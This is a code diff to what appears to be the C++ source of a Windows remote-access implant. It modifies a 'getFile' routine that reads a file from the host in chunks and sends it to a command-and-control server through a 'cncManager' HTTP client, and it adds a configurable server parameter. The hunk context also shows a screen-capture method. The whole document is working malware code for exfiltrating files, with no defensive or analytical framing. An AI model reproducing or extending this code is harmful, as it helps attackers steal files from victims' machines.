@@ -89,16 +89,19 @@ LPVOID commandManager::getScreen() {
     }
 }
 
-void commandManager::getFile(std::string& path) {
-    cncManager client;
+void commandManager::getFile(std::string& path, LPCWSTR server) {
+    cncManager client(server);
     FILE* fp = NULL;
     UCHAR* buffer = new UCHAR[sizeof(DDprotocol)+DATA_BUF_SIZE]; //450MB
     memset(buffer, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
     DWORD sequence = 0;
     ULONG64 size = 0;
-    DDprotocol proto;
-    proto.header = 0xdd;
-    proto.type = ftpResponse;
+
+    DDprotocol* dataFrame = new DDprotocol;
+    dataFrame->type = ftpResponse;
+    dataFrame->seq = 0;
+
+    
 
     fopen_s(&fp, path.c_str(), "rb+");
     if (fp) {
@@ -106,25 +109,27 @@ void commandManager::getFile(std::string& path) {
             size = fread(buffer + sizeof(DDprotocol), 1, DATA_BUF_SIZE, fp);
 
             if (sequence == 0 && size < DATA_BUF_SIZE) {
-                proto.len = size;
-                proto.seq = 0;
-                memcpy(buffer, &proto, sizeof(DDprotocol));
-                client.sendHttpRequest(buffer, sizeof(DDprotocol) + size);
+                dataFrame->len = size;
+                dataFrame->seq = 0;
+                memcpy(buffer, dataFrame, sizeof(DDprotocol));
+                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
                 break;
             }
             else if (size == DATA_BUF_SIZE) {
                 sequence++;
-                proto.len = size;
-                proto.seq = sequence;
-                memcpy(buffer, &proto, sizeof(DDprotocol));
-                client.sendHttpRequest(buffer, sizeof(DDprotocol) + size);
+                dataFrame->len = size;
+                dataFrame->seq = sequence;
+                std::cout << dataFrame->seq << std::endl;
+                memcpy(buffer, dataFrame, sizeof(DDprotocol));
+                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
             }
             else if (sequence != 0 && size < DATA_BUF_SIZE) {
                 sequence++;
-                proto.len = size;
-                proto.seq = 0;
-                memcpy(buffer, &proto, sizeof(DDprotocol));
-                client.sendHttpRequest(buffer, sizeof(DDprotocol) + size);
+                dataFrame->len = size;
+                dataFrame->seq = 0;
+                std::cout << dataFrame->seq << std::endl;
+                memcpy(buffer, dataFrame, sizeof(DDprotocol));
+                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
             }
             
 
@@ -132,6 +137,7 @@ void commandManager::getFile(std::string& path) {
         }
         fclose(fp);
     }
+    delete dataFrame;
     delete[] buffer;
 
 }
